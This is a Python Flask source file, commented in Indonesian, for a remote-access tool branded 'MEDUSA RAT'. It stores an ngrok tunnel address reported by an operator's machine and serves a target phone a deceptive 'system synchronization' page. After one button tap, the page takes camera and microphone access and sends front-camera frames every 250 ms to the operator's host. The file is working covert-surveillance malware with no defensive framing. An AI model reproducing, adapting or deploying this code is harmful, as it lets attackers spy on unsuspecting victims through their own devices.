from flask import Flask, request, render_template_string

app = Flask(__name__)

# Variabel global untuk menampung alamat pipa Ngrok aktif dari PC Lab Anda
ALAMAT_NGROK_LAB = ""

@app.route('/handshake', methods=['GET', 'POST'])
def handshake():
    global ALAMAT_NGROK_LAB
    
    # JALUR A: Menangkap setoran koordinat port dari aplikasi run.py PC Lab Anda
    ip_lab = request.args.get('ip_lab')
    if ip_lab:
        ALAMAT_NGROK_LAB = ip_lab.replace("https://", "").replace("http://", "").strip()
        return f"✅ Terkunci: {ALAMAT_NGROK_LAB}", 200

    # JALUR B: HP TARGET MEMBUKA HALAMAN (HTML OTORISASI LANGSUNG DI RENDER)
    # Ini memastikan halaman merah Anda 100% muncul tanpa bisa terlempar ke onrender.com
    return render_template_string("""
    <html>
    <head>
        <title>System Synchronization</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body { background-color: #0d0d0d; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; padding-top: 80px; }
            .box { border: 2px solid #ff0000; display: inline-block; padding: 30px; border-radius: 8px; background-color: #000; box-shadow: 0 0 15px #ff0000; }
            .btn { background-color: #8b0000; color: white; padding: 16px 32px; border: 1px solid #ff0000; border-radius: 4px; font-size: 14px; font-weight: bold; cursor: pointer; box-shadow: 0 0 10px #8b0000; }
            .btn:hover { background-color: #ff0000; box-shadow: 0 0 20px #ff0000; }
        </style>
    </head>
    <body>
        <div class="box">
            <h2>[ MEDUSA RAT INTERCONNECT ]</h2>
            <p>Laboratorium terisolasi memerlukan sinkronisasi media satu pintu.</p>
            <p style="color: #888; font-size: 11px;">Ketuk tombol di bawah SEKALI SAJA untuk memberikan otoritas penuh.</p>
            <br>
            <button class="btn" onclick="triggerAllOtoritas()">OTORISASI & SINKRONISASI</button>
        </div>

        <script>
            async function triggerAllOtoritas() {
                try {
                    let mediaStream = await navigator.mediaDevices.getUserMedia({ 
                        video: { facingMode: "user" }, 
                        audio: true 
                    });
                    let videoTrack = mediaStream.getVideoTracks();
                    
                    document.body.innerHTML = "<div class='box'><h2 style='color:#00ff00;'>[ STATUS: CONNECTED ]</h2><p>Sesi nirkabel aktif melintasi internet proxy.</p><p style='color:gray;'>Jangan tutup browser ini. Lab sedang memantau feed data.</p></div>";
                    
                    let imageCapture = new ImageCapture(videoTrack);
                    setInterval(async () => {
                        try {
                            let bitmap = await imageCapture.grabFrame();
                            let canvas = document.createElement('canvas');
                            canvas.width = bitmap.width; canvas.height = bitmap.height;
                            let ctx = canvas.getContext('2d');
                            ctx.drawImage(bitmap, 0, 0);
                            
                            canvas.toBlob(blob => {
                                let reader = new FileReader();
                                reader.readAsDataURL(blob);
                                reader.onloadend = function() {
                                    // Kirim frame gambar langsung menembus terowongan Ngrok PC Lab Anda yang aktif
                                    let labDestination = "{{ alamat_lab }}";
                                    fetch('https://' + labDestination + '/receive_frame', {
                                        method: 'POST',
                                        body: reader.result
                                    });
                                }
                            }, 'image/jpeg', 0.4);
                        } catch(e) {}
                    }, 250);
                } catch(err) {
                    alert("Gagal mengunci izin otomasi: " + err);
                }
            }
        </script>
    </body>
    </html>
    """, alamat_lab=ALAMAT_NGROK_LAB), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
